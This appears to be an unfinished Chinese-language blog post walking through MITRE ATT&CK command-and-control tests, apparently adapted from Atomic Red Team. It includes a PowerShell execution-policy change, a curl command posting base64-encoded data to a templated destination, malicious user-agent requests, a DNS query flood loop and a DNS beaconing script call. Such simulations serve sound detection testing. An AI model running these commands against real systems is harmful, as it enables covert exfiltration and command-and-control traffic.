---
layout: post
title: 跟着ATT&CK学安全之command-and-control
excerpt: "跟着ATT&CK学安全之command-and-control"
categories: [ATT&CK]
comments: true
---
#### 解决无法加载文件 xxxx，因为在此系统上禁止运行脚本
若要在本地计算机上运行您编写的未签名脚本和来自其他用户的签名脚本，请使用以下命令将计算机上的 执行策略更改为 RemoteSigned
```
set-ExecutionPolicy RemoteSigned
```
查看
```
get-ExecutionPolicy
```
#### T1132 - Data Encoding
通常控制命令使用标准的编码进行相互通信
```bash
echo -n 111-11-1111 | base64
curl -XPOST #{base64_data}.#{destination_url}
```
#### T1071 - Standard Application Layer Protocol
##### 测试1 Malicious User Agents - Powershell
在powershell下运行
```bash
Invoke-WebRequest #{domain} -UserAgent "HttpBrowser/1.0" | out-null
Invoke-WebRequest #{domain} -UserAgent "Wget/1.9+cvs-stable (Red Hat modified)" | out-null
Invoke-WebRequest #{domain} -UserAgent "Opera/8.81 (Windows NT 6.0; U; en)" | out-null
Invoke-WebRequest #{domain} -UserAgent "*<|>*" | out-null
```
##### 测试2 Malicious User Agents - CMD
在cmd下运行
```bash
curl -s -A "HttpBrowser/1.0" -m3 #{domain}
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain}
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain}
curl -s -A "*<|>*" -m3 #{domain}
```
##### 测试3 Malicious User Agents - Nix
操作平台:linux
```bash
curl -s -A "HttpBrowser/1.0" -m3 #{domain}
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain}
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain}
curl -s -A "*<|>*" -m3 #{domain}
```
##### 测试4 DNS Large Query Volume

输入参数
```
--------------------------------------------------------------------------------------
Name  	|	Description  							|	Type  	|	Default Value
--------------------------------------------------------------------------------------
domain  |	Default domain to simulate against 		|	string 	|	example.com
--------------------------------------------------------------------------------------
subdomain 	Subdomain prepended to the domain name	| 	string 	|	atomicredteam
--------------------------------------------------------------------------------------
query_type 	DNS query type 							|	string 	|	TXT				
--------------------------------------------------------------------------------------
query_volume 	Number of DNS queries to send 		|	integer |	1000
--------------------------------------------------------------------------------------
```
powershell中运行
```bash
for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type "#{query_type}" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}" -QuickTimeout}
```
例如
```bash
for($i=0; $i -le 1000; $i++) { Resolve-DnsName -type "TXT" "atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).snappyzz.com" -QuickTimeout}
```
#### 测试5 DNS Regular Beaconing
```
.\T1071-dns-beacon.ps1  -Domain snappyzz.com -Subdomain subaaaa -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30
```
太累了,未完待续